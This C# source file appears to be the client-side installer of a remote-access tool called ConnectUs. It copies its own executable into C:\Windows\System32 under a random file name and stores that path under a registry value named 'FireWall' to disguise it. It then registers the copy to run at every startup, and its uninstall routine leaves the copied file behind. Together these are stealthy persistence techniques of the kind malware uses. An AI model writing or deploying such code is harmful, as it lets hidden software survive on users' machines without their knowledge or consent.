using System.IO;

namespace ConnectUs.Core.ClientSide
{
    public class Installer : IInstaller
    {
        private const string RootPath = @"C:\Windows\System32\";
        private const string FilePathLocationRegistry = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Setup";
        private const string FilePathLocationRegistryKey = "FireWall";

        private readonly IEnvironment _environment;
        private readonly IFileService _fileService;
        private readonly IRegistry _registry;

        public Installer(IEnvironment environment, IFileService fileService, IRegistry registry)
        {
            _environment = environment;
            _fileService = fileService;
            _registry = registry;
        }

        public bool IsInstalled
        {
            get
            {
                var filePath = GetInstalledFilePath();
                if (string.IsNullOrEmpty(filePath)) {
                    return false;
                }
                return _fileService.Exists(filePath) && _registry.IsRegisteredAtStartup(filePath);
            }
        }
        public bool IsPartiallyInstalled
        {
            get
            {
                var filePath = GetInstalledFilePath();
                if (string.IsNullOrEmpty(filePath)) {
                    return false;
                }
                return _fileService.Exists(filePath) == false ^ _registry.IsRegisteredAtStartup(filePath) == false;
            }
        }
        public string Install()
        {
            var fileName = _fileService.GenerateRandomFileName();
            var targetFilePath = Path.Combine(RootPath, fileName);

            _registry.Add(FilePathLocationRegistry, FilePathLocationRegistryKey, targetFilePath);
            _fileService.Copy(_environment.ApplicationPath, targetFilePath);
            _registry.AddFileToStartupRegistry(targetFilePath);

            return targetFilePath;
        }
        public void Uninstall()
        {
            var filePath = GetInstalledFilePath();
            if (string.IsNullOrEmpty(filePath) == false) {
                _registry.RemoveFileFromStartupRegistry(filePath);
                _registry.Remove(FilePathLocationRegistry, FilePathLocationRegistryKey);
            }
        }

        private string GetInstalledFilePath()
        {
            return _registry.Get(FilePathLocationRegistry, FilePathLocationRegistryKey);
        }
    }
}